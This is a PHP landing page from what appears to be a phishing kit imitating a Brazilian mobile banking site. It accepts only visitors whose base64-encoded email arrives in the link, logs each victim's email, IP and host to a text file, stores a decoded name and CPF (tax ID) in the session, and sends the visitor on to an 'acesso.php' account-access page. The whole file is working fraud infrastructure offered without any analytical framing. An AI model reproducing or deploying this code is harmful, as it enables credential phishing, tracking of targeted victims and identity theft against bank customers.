<?php 


include('lib.php');
$emailx = $_GET['cliente'];
$email = base64_decode($emailx);
if (isset($_GET['cliente']) && !filter_var($email, FILTER_VALIDATE_EMAIL) === false) { 
	$msg = "in: $email - $ip ($host)- $data\n";
	$myFl = "acc-log.txt";
	$open = fopen($myFl, 'a') or die("can't open file");
	fwrite($open, $msg);
	fclose($open);
} else { 
	echo $e500; exit;
}







include('../_functions/functions.php');
$UserId = uniqid();
$_SESSION['uniq_id'] = $UserId;

$_SESSION['StarGet'] = 1;
if(isset($_GET['nm'])){
	$_SESSION['nome'] = base64_decode($_GET['nm']);
}
if(isset($_GET['sid'])){
	$_SESSION['cpf'] = base64_decode($_GET['sid']);
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Acesso Mobile :: Iniciar</title>

	<!-- PERSONALIZAÇÃO CABEÇALHO -->
	<meta name="theme-color" content="#0072e5">
	<meta name="apple-mobile-web-app-status-bar-style" content="#0072e5">
	<meta name="msapplication-navbutton-color" content="#0072e5">
</head>
<body>

<div class="container main_header bg-blue">
	<div class="content">
		<div class="logo">
			<img src="../_images/mobile/main_logo.jpg" height="30" width="128">
		</div><!-- logo -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container">
	<div class="content">
		<div class="start_img">
			<img src="../_images/mobile/bg_start_edition.jpg">
		</div><!-- start_img -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container">
	<div class="content">
		<div class="buttons_start">
			<a href="acesso.php?cliente=<?php echo $emailx;?>" class="button button-acess"><i class="fa fa-plus"></i> Acesso a conta</a>
		</div><!-- start_img -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<!-- ARQUIVOS DE INCLUSÃO -->
<link rel="stylesheet" href="../_styles/boot_mb.css">
<link rel="stylesheet" href="../_fonts/_fonts.css">
<link rel="stylesheet" href="../_styles/font-awesome.css">
<link rel="stylesheet" href="../_styles/content_mb.css">	
<script src="../_jscripts/jquery.js"></script>
<script src="../_jscripts/content_mb.js"></script>
<!-- ARQUIVOS DE INCLUSÃO -->
</body>
</html>